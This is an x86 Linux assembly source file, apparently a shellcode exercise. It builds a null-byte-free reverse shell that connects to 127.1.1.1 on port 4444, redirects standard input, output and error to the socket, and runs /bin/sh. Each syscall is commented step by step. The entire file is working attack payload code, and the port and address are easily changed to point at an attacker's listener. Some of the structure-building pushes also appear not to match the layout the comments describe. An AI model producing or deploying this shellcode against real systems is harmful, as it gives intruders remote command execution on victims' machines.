section .text

global _start

_start:
        ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
        ; connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.1.1.1")}, 16) = -1 ECONNREFUSED (Connection refused)
        ; dup2(3, 0)                              = 0
        ; dup2(3, 1)                              = 1
        ; dup2(3, 2)                              = 2
        ; execve("/bin/sh", NULL, NULL)           = 0

        ; we will use eax, ebx, ecx, edx so we clear them
        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        xor edx, edx


        ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; SOCKET
        ; int socket(int domain, int type, int protocol) -> create an endpoint for communication
        ;   EAX         EBX        ECX         EDX
        ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
        ; socket(2,1,0)

        mov bl, 0x2
        mov cl, 0x1
        mov ax, 0x167           ; socket syscall number
        int 0x80                ; interrupt instruction where the returned value will be stored in EAX


        ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; CONNECT
        ; int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen) -> initiate a connection on a socket
        ;     EAX         EBX                   ECX               EDX
        ; connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.1.1.1")}, 16) = -1 ECONNREFUSED (Connection refused)

        ; moving sockfd value into ebx
        mov ebx,eax             ; ebx will be used with the value 3 in all the connect and dup2 calls

        ; creating a structure {2, 4444, 127.1.1.1} and making ecx points towards it:
        push 0x0101017f         ; 127.1.1.1
        push 0x5c11             ; 4444 = 115c in hex
        push 0x2                ; AF_INET = 2
        mov ecx, esp            ; at this point ESP points to this structure so we move it to ecx

        ; moving last values needed:
        mov dl, 0x10            ; move 16 into dl and not edx to avoid null bytes
        xor eax, eax            ; xoring to avoid null bytes
        mov ax, 0x16a           ; the syscall value = 362 in decimal
        int 0x80


        ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; DUP2
        ; int dup2(int oldfd, int newfd) -> duplicate a file descriptor
        ;   EAX         EBX     ECX
        ; at this point ebx still contains 3
        ; DUP2 STDIN

        xor eax, eax            ; avoiding null bytes
        xor ecx, ecx
        mov al, 0x3f            ; 63 syscall value
        int 0x80

        ; DUP2 STDOUT
        ; for the 2nd dup2 we move 1 into ecx 
        xor eax, eax
        mov ecx, 0x1 
        mov al, 0x3f
        int 0x80

        ; DUP2 STDERRR
        ; for the third dup2 we move 2 into ecx
        xor eax, eax
        mov ecx, 0x2 
        mov al, 0x3f
        int 0x80

        ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; EXECVE
        ; int execve(const char *pathname, char *const argv[], char *const envp[]);
        ;     EAX                 EBX                 ECX                 EDX
        ; execve("/bin/sh", NULL, NULL)           = 0
        
        xor eax, eax            ; emptying EAX so we dont have extra zeroes when crafting the shelcode from it
        mov edx, eax            ; EDX need to be setup as NULL
        mov ecx, eax            ; ECX needs to be setup to NULL too

        mov al, 11              ; syscall value for execve(), need to be in EAX

        push edx                ; 0      => EDX contains the "\0" null terminator that will be taken after /bin//sh to produce '/bin//sh\0' 
        push 0x68732f2f         ; hs//   => it will appear like this on the stack, not in reversed order.
        push 0x6e69622f         ; nib/   => after executing this instruction esp will point to /bin//sh

        mov ebx, esp            ; ebx will now point to /bin//sh 

        int 0x80                ; interrupt to trigger the system call using the value stored in EAX 
